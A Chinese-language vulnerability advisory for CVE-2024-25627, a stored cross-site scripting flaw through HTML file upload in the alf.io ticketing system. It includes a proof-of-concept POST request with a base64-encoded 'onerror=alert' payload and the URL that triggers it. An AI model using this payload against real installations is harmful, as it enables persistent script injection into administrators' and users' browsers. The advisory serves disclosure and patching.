### 漏洞标题：CVE-2024-25627 

### 漏洞描述：

>Alf.io是一个免费且开源的事件出席管理系统。alf.io应用程序上的管理员可以上传触发JavaScript负载的HTML文件。因此，攻击者通过获取alf.io应用程序的管理员访问权限，可能能够通过注入跨站脚本（XSS）负载来持久访问系统。该问题已在版本2.0-M4-2402中得到修复，建议用户升级。这个漏洞没有已知的解决方法。

### 影响范围：

alf.io开源的门票预订系统
[github地址](https://github.com/alfio-event/alf.io)

### 漏洞来源：

CVE-2024-25627

### 漏洞类型：

CWE-434	危险类型文件的不加限制上传
CWE-79	在Web页面生成时对输入的转义处理不恰当（跨站脚本）

### 可能利用性：
POC:
管理员可以向 发出以下 POST 请求/admin/api/file/upload。
数据如下
```
{"file":"PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+",
"type":"text/html",
"name":"ANYTHING"}
```
文件密钥保存```<img src=x onerror=alert(document.domain)>```Base64 编码。

<img src="img/1.png" >

现在，在访问 时```/file/9e35e10c75a7817ebd66d4345b99a05eeb5ef5810a11acb22303d704aa4595c0```，有效负载就会触发。

<img src="img/2.png" >

### 建议方案：

建议更新当前系统或软件至最新版，完成漏洞的修复。

### 备注：
利用情况:暂无
补丁情况:N/A
披露时间:2024-02-17
测试者：[Augusta-Gustava](https://github.com/Augusta-Gustava)